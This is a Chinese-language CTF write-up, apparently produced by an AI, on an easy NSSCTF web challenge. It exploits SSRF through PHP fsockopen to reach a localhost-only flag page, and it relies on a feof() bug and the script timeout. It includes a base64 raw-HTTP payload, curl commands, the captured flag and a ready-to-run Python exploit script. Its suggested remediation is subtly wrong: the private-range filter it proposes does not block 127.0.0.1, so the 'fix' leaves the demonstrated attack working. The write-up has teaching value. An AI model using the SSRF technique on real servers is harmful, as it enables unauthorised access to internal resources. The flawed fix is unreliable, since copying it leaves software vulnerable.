---
title: "SSRF漏洞利用——从fsockopen到绕过IP限制获取Flag"
ctf: "NSSCTF"
date: 2026-05-18
category: web
difficulty: easy
flag_format: "nssctf{...}"
author: "claude"
---

# SSRF漏洞利用——从fsockopen到绕过IP限制获取Flag

## 摘要

本题提供了一个存在 SSRF（服务器端请求伪造）漏洞的 PHP 页面，攻击者可通过 `fsockopen` 函数构造任意 TCP 连接，同时目标 flag 接口有 IP 访问限制（仅限 localhost）。通过构造原始 HTTP 请求包并利用 SSRF 从本机地址（127.0.0.1）访问 flag 接口，配合 PHP `max_execution_time` 机制绕过代码中 `feof()` 函数误用导致的死循环问题，最终成功获取 flag。

## 环境信息

| 项目 | 内容 |
|------|------|
| 目标地址 | `http://node5.anna.nssctf.cn:23302/` |
| Web 服务器 | Apache/2.4.38 (Debian) |
| 内网地址 | `172.16.0.7:80` |
| Flag 格式 | `nssctf{...}` |

---

## 详细解题步骤

### 第一步：信息收集与源码获取

首先访问目标网站根目录：

```
http://node5.anna.nssctf.cn:23302/
```

页面显示 Apache2 Debian 默认欢迎页，确认服务器为 Apache/2.4.38 (Debian)，Web 目录为 `/var/www/html/`。

题目提示访问 `index.php`，访问后得到 PHP 源代码：

```
http://node5.anna.nssctf.cn:23302/index.php
```

**返回的源码：**

```php
<?php
highlight_file(__FILE__);          // 显示本文件源码，方便调试
error_reporting(0);                // 关闭所有错误显示

$data = base64_decode($_GET['data']);  // 获取GET参数data并base64解码
$host = $_GET['host'];                 // 获取GET参数host（目标IP/域名）
$port = $_GET['port'];                 // 获取GET参数port（目标端口）

$fp = fsockopen($host, intval($port), $error, $errstr, 30);
// 建立原始TCP socket连接到 $host:$port，超时30秒

if(!$fp) {
    die();
} else {
    fwrite($fp, $data);                // 先把base64解码后的原始数据写入socket
    while(!feof($data))                 // ★ 关键BUG：应该是feof($fp)而非feof($data) ★
    {
        echo fgets($fp, 128);           // 从socket读取响应并输出到浏览器
    }
    fclose($fp);
}
?>
```

#### 原理解析

这段代码存在一个典型的 **SSRF（Server-Side Request Forgery）** 漏洞：

| 可控参数 | 用途 | 攻击面 |
|---------|------|-------|
| `host` | 目标主机地址 | 可设为 `127.0.0.1` 或内网 IP，使服务器访问自身或内网资源 |
| `port` | 目标端口 | 可探测内网服务（如 Redis:6379、MySQL:3306 等） |
| `data`（base64） | 发送的原始数据 | 可构造任意协议请求（HTTP、Redis、MySQL 等） |

`fsockopen()` 函数不同于 `curl`，它工作在 TCP 层而不是 HTTP 应用层，不自动处理协议封装。这意味着：
- 你能连接任意端口上的任意服务
- 但你需要手动构造应用层协议数据

`intval($port)` 将端口转为整数，防止非数字输入，但 `0` 或负数可能导致不可预知行为。

---

### 第二步：发现 flag 接口与访问限制

发现服务器上存在 `/flag.php` 文件（可通过目录扫描工具如 dirsearch 发现），直接访问：

```
http://node5.anna.nssctf.cn:23302/flag.php
```

**响应：**

```
🥰localhost plz🥰
```

这表明 `/flag.php` 中实现了 IP 访问控制逻辑，类似于：

```php
<?php
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    die("🥰localhost plz🥰");
}
// 输出 flag
echo $flag;
?>
```

**`$_SERVER['REMOTE_ADDR']`** 是 PHP 中获取客户端真实 IP 的变量，其值由 TCP 连接的远端地址决定。外部请求的 REMOTE_ADDR 不会是 127.0.0.1，因此直接访问被拦截。

---

### 第三步：构造 SSRF 利用载荷

要绕过 IP 校验，需要让服务器自己（作为客户端）去请求 `/flag.php`。利用 index.php 中的 SSRF 漏洞：

1. **设置 `host=127.0.0.1`** → `fsockopen` 连接到本机 Apache
2. **设置 `port=80`** → Apache 监听端口
3. **构造原始 HTTP 请求报文** → 发送给 Apache 请求 `/flag.php`

当服务器通过 `fsockopen("127.0.0.1", 80)` 发起连接时，TCP 连接的源地址就是 `127.0.0.1`，因此 `/flag.php` 看到的 `REMOTE_ADDR` 为 `127.0.0.1`，IP 校验通过。

#### 原始 HTTP 请求报文

由于 `fsockopen` 不封装 HTTP 协议，我们需要手动构造完整的 HTTP 请求：

```
GET /flag.php HTTP/1.1\r\n
Host: 127.0.0.1\r\n
Connection: close\r\n
\r\n
```

**报文格式说明：**
- 第一行：请求方法 + 路径 + HTTP 版本，以 `\r\n` 结尾
- 后续行：HTTP 头部，每行以 `\r\n` 结尾
- 空行（`\r\n\r\n`）：标志头部结束
- `Connection: close`：要求服务器在响应后关闭连接，避免挂起

#### Base64 编码

因为 `data` 参数需要 base64 编码，执行：

```bash
echo -ne "GET /flag.php HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | base64 -w0
```

**结果：**

```
R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
```

**参数说明：**
- `-n`：不追加末尾换行符
- `-e`：启用转义字符解析（使 `\r\n` 被正确解释）
- `base64 -w0`：编码时不换行（生成单行字符串）

---

### 第四步：发送 SSRF 请求并应对死循环

构造完整 URL 并发送请求：

```
http://node5.anna.nssctf.cn:23302/index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
```

使用 curl 发送（设置 45 秒超时）：

```bash
curl -s --max-time 45 "http://node5.anna.nssctf.cn:23302/index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo="
```

#### 关键 Bug 分析：feof($data) 导致死循环

```php
while(!feof($data))   // ← 应该是 feof($fp)！
{
    echo fgets($fp, 128);
}
```

`feof()` 函数签名是 `feof(resource $stream): bool`，它要求传入一个**文件句柄资源**。但 `$data` 是 `base64_decode()` 返回的**字符串**。

在 PHP 各版本中的表现：

| PHP 版本 | `feof("字符串")` 行为 |
|----------|---------------------|
| PHP 5.x  | 抛出 Warning，返回 `false` |
| PHP 7.x  | 抛出 Warning，返回 `false` |
| PHP 8.x  | 抛出 TypeError（程序崩溃） |

由于 `error_reporting(0)` 屏蔽了 Warning，在 PHP 5/7 下：
- `feof($data)` → `false`
- `!false` → `true` → 循环条件永远为真
- **形成死循环**，PHP 脚本永不结束

#### 突破原理：PHP max_execution_time

PHP 有一个安全配置项 **`max_execution_time`**，默认值为 **30 秒**，限制单个 PHP 脚本的最大执行时间。

**时间线：**

```
0s      请求到达 index.php
         → highlight_file() 输出源码到输出缓冲区
0.001s  fsockopen("127.0.0.1", 80) 连接成功
0.002s  fwrite() 发送原始HTTP请求到Apache
0.003s  Apache返回/flag.php的响应（含flag）
0.004s  进入while循环，feof($data)返回false → 死循环开始
...
30s     PHP max_execution_time 到达
         → PHP 进程被强制终止
         → 输出缓冲区被刷新
         → SSRF 响应内容（含flag）发送给客户端
```

这就是为什么需要 `--max-time 45`：curl 需要等待 PHP 超时（30 秒）后才能收到刷新出的数据。

---

### 第五步：获取 Flag

执行 curl 命令后大约 30 秒，收到完整的响应：

```html
<!-- PHP 语法高亮源码部分 -->
<code><span ...>
&lt;?php
highlight_file(__FILE__);
...
</span>
</code>

<!-- SSRF 转发的 /flag.php 响应 -->
HTTP/1.1 200 OK
Date: Mon, 18 May 2026 11:10:48 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 44

nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
```

响应分为两部分：
1. **上半部分**：`highlight_file(__FILE__)` 输出的本文件源码（语法高亮）
2. **下半部分**：SSRF 请求转发后，`fgets()` 从 socket 读取的 `/flag.php` 的 HTTP 响应

---

## 最终 Flag

```
nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
```

---

## 完整利用脚本

将以下脚本保存为 `exploit.py` 并运行即可一步获得 flag：

```python
#!/usr/bin/env python3
import urllib.request
import base64

target = "http://node5.anna.nssctf.cn:23302"

# 1. 构造原始HTTP请求报文
http_request = (
    "GET /flag.php HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Connection: close\r\n"
    "\r\n"
)

# 2. Base64编码
data_b64 = base64.b64encode(http_request.encode()).decode()

# 3. 构造SSRF利用URL
ssrf_url = (
    f"{target}/index.php"
    f"?host=127.0.0.1"
    f"&port=80"
    f"&data={data_b64}"
)

print(f"[*] SSRF URL: {ssrf_url}")
print("[*] 发送请求并等待 PHP max_execution_time 超时（约30秒）...")

# 4. 发送请求，设置45秒超时等待PHP进程被杀死后刷新缓冲区
req = urllib.request.Request(ssrf_url)
resp = urllib.request.urlopen(req, timeout=45)
body = resp.read().decode('utf-8', errors='replace')

# 5. 提取flag（响应中的最后一行）
lines = body.strip().split('\n')
for line in lines:
    if 'nssctf{' in line:
        print(f"\n[+] Flag: {line.strip()}")
        break
else:
    # 如果没找到flag，打印完整响应
    print(body[-500:])
```

运行方式：

```bash
python3 exploit.py
```

---

## 知识点总结

| 知识点 | 说明 |
|-------|------|
| **SSRF** | 服务器端请求伪造，利用 `fsockopen` 等函数发起内网请求 |
| **原始TCP构造** | 通过 `fsockopen` 需要手动构造应用层协议数据 |
| **IP校验绕过** | 利用 SSRF 从 localhost 发起请求使 `REMOTE_ADDR=127.0.0.1` |
| **feof()误用** | `feof($data)` 用在字符串上永远返回 false 导致死循环 |
| **max_execution_time** | PHP 脚本超时机制，30 秒后强制终止并刷新输出缓冲区 |
| **原始HTTP报文** | 格式：`METHOD /path HTTP/1.1\r\nHeaders\r\n\r\n` |

## 修复建议

如果此代码用于生产环境，应做以下修复：

1. **限制 SSRF 目标地址**：禁止连接内网 IP/端口
   ```php
   if (filter_var($host, FILTER_VALIDATE_IP) && 
       !filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
       die("Forbidden");
   }
   ```

2. **修复 feof 参数**：将 `feof($data)` 改为 `feof($fp)`
   ```php
   while(!feof($fp))  // 正确：检测socket是否关闭
   ```

3. **移除 highlight_file**：生产环境不应泄漏源代码
   ```php
   // highlight_file(__FILE__);  // 删除此行
   ```
